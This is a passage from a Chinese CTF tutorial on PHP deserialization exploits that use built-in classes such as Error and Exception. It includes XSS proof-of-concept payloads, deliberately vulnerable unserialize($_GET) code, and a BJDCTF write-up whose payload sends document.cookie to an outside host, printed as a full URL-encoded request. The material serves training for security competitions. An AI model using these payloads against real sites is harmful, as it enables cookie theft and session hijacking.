<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span> = <span class="string">&#x27;../../../../test.php&#x27;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$evil</span> = <span class="keyword">new</span> <span class="title class_">Test1</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$evil</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="php原生类总结"><a class="markdownIt-Anchor" href="#php原生类总结"></a> PHP原生类总结</h3>
<p>其实，在CTF题目中，可以利用php原生类来进行XSS,反序列化，SSRF，XXE和读文件的思路</p>
<p>通过遍历看一下php的内置类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;    </span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;    </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Generator</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveCachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileInfo</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">FilesystemIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveDirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">GlobIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplTempFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFixedArray</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunctionAbstract</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunction</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionParameter</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionNamedType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClass</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionProperty</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClassConstant</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionZendExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__toString</span></span><br><span class="line">PDO::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PDOStatement</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">SimpleXMLElement</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SimpleXMLIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SoapClient</span>::<span class="variable constant_">__call</span></span><br><span class="line"><span class="title class_">SoapFault</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SoapFault</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CURLFile</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line">mysqli_sql_exception::<span class="variable constant_">__wakeup</span></span><br><span class="line">mysqli_sql_exception::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__toString</span></span><br></pre></td></tr></table></figure>
<p>只需要注意一些常用的内置类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span></span><br><span class="line"><span class="built_in">Exception</span></span><br><span class="line">SoapClient</span><br><span class="line"><span class="built_in">DirectoryIterator</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span></span><br><span class="line"><span class="built_in">SplFileObject</span></span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure>
<h4 id="利用errorexception-内置类进行-xss"><a class="markdownIt-Anchor" href="#利用errorexception-内置类进行-xss"></a> 利用Error/Exception 内置类进行 XSS</h4>
<h5 id="error内置类"><a class="markdownIt-Anchor" href="#error内置类"></a> Error内置类</h5>
<p>使用条件:</p>
<ul>
<li>适用于php7版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，可以尝试利用这个来做一个xss，直接利用xss来打。其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这也是挖洞的一种思路。</p>
<p>测试例子：</p>
<p>本地放一个error.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化</p>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接可以弹出xss，触发了xss漏洞</p>
<h4 id="exception内置类"><a class="markdownIt-Anchor" href="#exception内置类"></a> Exception内置类</h4>
<ul>
<li>适用于php5、7版本</li>
<li>开启报错的情况下</li>
</ul>
<p>原理是类似的</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="bjdctf-2ndxss之光"><a class="markdownIt-Anchor" href="#bjdctf-2ndxss之光"></a> [BJDCTF 2nd]xss之光</h5>
<p>首先进入题目中，我们找到git泄露拿到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>这就是一个典型的反序列化函数，但是没有给出反序列化的类，我们无法构造pop链，只有利用php内置类来反序列化，加上一个echo，我们就可以利用<code>Error</code>内置类来<code>XSS</code></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$poc = new Exception(&quot;&lt;script&gt;window.open(&#x27;http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>一般xss的题都是在cookie理里，所以我们利用XSS把cookie带出来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?yds_is_so_beautiful=O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A109%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.open%<span class="number">28</span>%<span class="number">27</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fde28dfb3-f224-<span class="number">48</span>d4-b579-f1ea61189930.node3.buuoj.cn%<span class="number">2</span>F%<span class="number">3</span>F%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fusercode%<span class="number">2</span>Ffile.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>然后flag就在cookie中</p>
<h4 id="使用-errorexception-内置类绕过哈希比较"><a class="markdownIt-Anchor" href="#使用-errorexception-内置类绕过哈希比较"></a> 使用 Error/Exception 内置类绕过哈希比较</h4>
<p>Error和Exception这两个PHP内置类，但对他们不限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。</p>
<h5 id="error类"><a class="markdownIt-Anchor" href="#error类"></a> Error类</h5>
<p>条件：php7.0.0</p>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 属性 */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>类属性：</strong></p>
<ul>
<li>message：错误消息内容</li>
<li>code：错误代码</li>
<li>file：抛出错误的文件名</li>
<li>line：抛出错误在该文件中的行数</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li>
</ul>
